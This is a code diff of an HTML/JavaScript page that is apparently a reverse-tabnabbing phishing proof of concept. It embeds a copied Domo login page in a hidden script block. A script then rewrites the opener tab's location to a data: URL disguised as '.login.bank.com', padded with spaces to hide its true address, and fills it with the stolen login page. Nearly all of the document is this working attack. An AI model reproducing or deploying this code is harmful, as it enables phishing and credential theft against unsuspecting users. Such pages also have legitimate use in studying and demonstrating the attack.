@@ -1,15 +1,4 @@
-<script>
-var spaces = 
-  "                                                                          " +
-  "                                                                          " +
-  "                                                                          " +
-  "                                                                          " +
-  "                                                                          " +
-  "                                                                          " +
-  "                                                                          " +
-  "                                                                          ";
-
-var html = `
+<script id='codez' type='text/plain'>
 <html>
   <head>
   <title>Domo</title>
@@ -92,7 +81,8 @@ SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 <img height="1" width="1" style="border-style:none;" alt="" src="https://d.adroll.com/cm/l/out">
 <img height="1" width="1" style="border-style:none;" alt="" src="https://d.adroll.com/cm/o/out">
 <img height="1" width="1" style="border-style:none;" alt="" src="https://d.adroll.com/cm/g/out?google_nid=adroll2">
-</div></head><body class="centered-container" ng-class="{'ad-based-container': (false || false) &amp;&amp; showAdBasedLogin}" onload="checkShowCompatabilityModal()" style=""><iframe name="google_conversion_frame" title="Google conversion frame" width="300" height="13" src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/1072736339/?random=1482278580863&amp;cv=8&amp;fst=1482278580863&amp;num=1&amp;fmt=1&amp;guid=ON&amp;u_h=1440&amp;u_w=2560&amp;u_ah=1417&amp;u_aw=2560&amp;u_cd=24&amp;u_his=2&amp;u_tz=-420&amp;u_java=false&amp;u_nplug=5&amp;u_nmime=7&amp;frm=0&amp;url=https%3A%2F%2Ffoo.domo.com%2Fauth%2Findex&amp;tiba=Domo" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no"></iframe>
+</div></head>
+<body class="centered-container" ng-class="{'ad-based-container': (false || false) &amp;&amp; showAdBasedLogin}" onload="checkShowCompatabilityModal()" style=""><iframe name="google_conversion_frame" title="Google conversion frame" width="300" height="13" src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/1072736339/?random=1482278580863&amp;cv=8&amp;fst=1482278580863&amp;num=1&amp;fmt=1&amp;guid=ON&amp;u_h=1440&amp;u_w=2560&amp;u_ah=1417&amp;u_aw=2560&amp;u_cd=24&amp;u_his=2&amp;u_tz=-420&amp;u_java=false&amp;u_nplug=5&amp;u_nmime=7&amp;frm=0&amp;url=https%3A%2F%2Ffoo.domo.com%2Fauth%2Findex&amp;tiba=Domo" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no"></iframe>
 
 
 
@@ -210,8 +200,21 @@ SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
     </div>
   </div>
 </div>
+</script>
 
-`;
+<script>
+var spaces = 
+  "                                                                          " +
+  "                                                                          " +
+  "                                                                          " +
+  "                                                                          " +
+  "                                                                          " +
+  "                                                                          " +
+  "                                                                          " +
+  "                                                                          ";
+
+var html = document.getElementById('codez').innerHTML;
+console.log(html)
 
 if (window.opener) {
   window.opener.location = 'data:text/html;.login.bank.com/auth/index' + spaces + ',' + escape(html);
